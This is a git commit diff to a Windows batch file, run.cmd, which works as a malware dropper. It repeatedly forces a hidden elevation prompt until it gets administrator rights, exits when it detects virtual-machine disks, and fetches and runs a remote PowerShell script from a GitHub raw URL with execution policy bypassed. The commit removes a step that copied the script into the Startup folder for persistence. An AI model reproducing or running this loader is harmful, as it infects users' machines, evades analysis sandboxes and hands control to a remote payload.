5eb89c6e0d7a676f31f8c090579028ef141f301b
43a1723 <hai1723notgay@gmail.com>
2024-08-05 12:34:20 +0700

    Update run.cmd

--- run.cmd
+++ run.cmd
@@ -4,7 +4,4 @@ cd /d "%~dp0"
 net session >nul 2>&1
 if NOT %errorlevel% == 0 ( powershell -Win Hidden -NoP -ExecutionPolicy Bypass "while(1){try{Start-Process -WindowStyle Hidden -Verb RunAs -FilePath '%~f0';exit}catch{}}" & exit )
 powershell "$d = wmic diskdrive get model;if ($d -like '*DADY HARDDISK*' -or $d -like '*QEMU HARDDISK*') { taskkill /f /im cmd.exe }"
-set "source=%~f0"
-set "startup_folder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
-copy "%source%" "%startup_folder%\windows.bat"
 powershell -w hidden -nop -ep bypass -c "iwr -useb https://raw.githubusercontent.com/43a1723/test/main/download.ps1 | iex"
